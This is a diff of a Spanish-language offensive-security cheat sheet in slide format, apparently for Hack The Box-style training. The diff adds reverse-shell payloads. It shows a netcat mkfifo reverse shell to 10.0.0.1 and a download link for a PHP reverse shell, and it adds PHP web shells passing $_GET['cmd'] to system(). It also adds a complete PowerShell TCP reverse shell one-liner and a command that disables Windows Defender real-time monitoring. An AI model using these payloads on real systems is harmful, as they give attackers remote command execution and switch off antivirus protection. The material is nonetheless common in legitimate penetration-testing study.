@@ -39,10 +39,31 @@ paginate: true
 └──╼ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
-## PHP
+### PHP
 En PHP se puede ingresar un archivo malicioso que devuelva una reverse shell.
 
 >[Descarga archivo aquí](http://www.mediafire.com/file/a3i5v7urr7cp6gw/php-reverse-shell-1.0.tar.gz/file)
+
+Para testear ejecución remota de comandos:
+
+```php
+<?php system($_GET[‘ls’]);?>
+
+## <?php system($_GET[‘cmd’]);?>
+```
+
+
+### PowerShell
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+#### Deshabilitar Antivirus
+
+```powershell
+PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ### Ejemplo de uso
 En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
